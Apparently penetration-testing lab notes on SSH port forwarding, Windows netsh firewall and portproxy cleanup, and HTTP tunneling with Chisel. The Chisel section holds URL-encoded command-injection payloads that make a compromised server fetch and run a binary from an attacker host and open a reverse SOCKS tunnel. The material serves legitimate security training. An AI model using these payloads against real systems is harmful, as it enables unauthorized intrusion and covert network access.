### Nmap Scan and SSH Connection

**Nmap Scan Report:**

- **Version:** Nmap 7.92
- **Scan Date and Time:** 2022-07-21 06:28 EDT
- **Target IP:** 192.168.50.64
- **Host Status:** Up (0.00060s latency)
- **Open Port:** 2222/tcp (EtherNetIP-1)
- **MAC Address:** 00:0C:29:A9:9F:3D (VMware)
- **Scan Duration:** 0.23 seconds

**Summary:**
The Nmap scan shows that port 2222 on the target host 192.168.50.64 is open, indicating that we can establish an SSH connection to this port.

**SSH Connection:**

- **Command:**
  ```bash
  ssh PI:EMAIL -p2222
  ```

- **Output:**
  ```plaintext
  The authenticity of host '[192.168.50.64]:2222 ([192.168.50.64]:2222)' can't be established.
  ED25519 key fingerprint is SHA256:3TRC1ZwtlQexLTS04hV3ZMbFn30lYFuQVQHjUqlYzJo.
  This host key is known by the following other names/addresses:
  ~/.ssh/known_hosts:5: [hashed name]
  Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
  Warning: Permanently added '[192.168.50.64]:2222' (ED25519) to the list of known hosts.
  PI:EMAIL's password:
  Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-122-generic x86_64)
  * Documentation: https://help.ubuntu.com
  * Management: https://landscape.canonical.com
  * Support: https://ubuntu.com/advantage
  System information as of Sun 21 Aug 2022 10:40:26 PM UTC
  System load: 0.0 Processes: 231
  Usage of /: 60.9% of 7.77GB Users logged in: 0
  Memory usage: 16% IPv4 address for ens192: 10.4.50.215
  Swap usage: 0% IPv4 address for ens224: 172.16.50.215
  0 updates can be applied immediately.
  Last login: Sat Aug 20 21:47:47 2022 from 10.4.50.63
  database_admin@pgdatabase01:~$
  ```

**Summary:**
We successfully connected to the SSH server on port 2222 of the target host 192.168.50.64. The system is running Ubuntu 20.04.4 LTS, and the user `database_admin` is logged in.

### Deleting Firewall Rules and Port Forwarding

**Deleting the Firewall Rule:**

- **Command:**
  ```bash
  C:\Users\Administrator> netsh advfirewall firewall delete rule name="port_forward_ssh_2222"
  Deleted 1 rule(s).
  ```

- **Summary:**
  The firewall rule named "port_forward_ssh_2222" was successfully deleted.

**Deleting the Port Forwarding Rule:**

- **Command:**
  ```bash
  C:\Windows\Administrator> netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.64
  ```

- **Summary:**
  The port forwarding rule was successfully deleted, although no confirmation message was displayed.

**PowerShell Equivalents:**
While many Windows Firewall commands have PowerShell equivalents (e.g., `New-NetFirewallRule`, `Disable-NetFirewallRule`), the `netsh interface portproxy` command does not. For simplicity, we used `netsh` commands in this section. However, PowerShell is extremely useful for Windows Firewall enumeration and configuration, and you may wish to experiment with it.

### Summary of Port Forwarding and SSH Tunneling

In this module, we covered the concepts of port forwarding and SSH tunneling. We created a port forward on Windows using the `netsh` command and a firewall rule to allow inbound traffic on our listening port. These techniques were used to create a working port forward from the WAN interface of MULTISERVER03 to the SSH server of PGDATABASE01.

### HTTP Tunneling and Chisel

**HTTP Tunneling Fundamentals:**

- **Scenario:**
  - Compromised machine: CONFLUENCE01
  - Network restrictions: Only HTTP traffic allowed, all other outbound traffic blocked
  - Goal: Establish a tunnel to access PGDATABASE01 via SSH

- **Tool:**
  - **Chisel**: An HTTP tunneling tool that encapsulates data streams within HTTP and uses SSH for encryption.

**Setting Up Chisel:**

1. **Copy Chisel Binary to Target:**
   - **Command:**
     ```bash
     kali@kali:~$ sudo cp $(which chisel) /var/www/html/
     ```
   - **Start Apache2:**
     ```bash
     kali@kali:~$ sudo systemctl start apache2
     ```

2. **Download and Execute Chisel on Target:**
   - **Wget Command:**
     ```bash
     wget 192.168.118.4/chisel -O /tmp/chisel && chmod +x /tmp/chisel
     ```
   - **cURL Injection Payload:**
     ```bash
     curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27wget%20192.168.118.4/chisel%20-O%20/tmp/chisel%20%26%26%20chmod%20%2Bx%20/tmp/chisel%27%29.start%28%29%22%29%7D/
     ```

3. **Start Chisel Server:**
   - **Command:**
     ```bash
     kali@kali:~$ chisel server --port 8080 --reverse
     ```

4. **Start Chisel Client:**
   - **Command:**
     ```bash
     /tmp/chisel client 192.168.118.4:8080 R:socks > /dev/null 2>&1 &
     ```
   - **cURL Injection Payload:**
     ```bash
     curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20192.168.118.4:8080%20R:socks%27%29.start%28%29%22%29%7D/
     ```

**Summary:**
We successfully set up an HTTP tunnel using Chisel, allowing us to bypass network restrictions and establish a secure connection to the internal network. The Chisel server listens on port 8080 and creates a reverse SOCKS proxy, while the Chisel client on the target machine forwards traffic through the HTTP tunnel.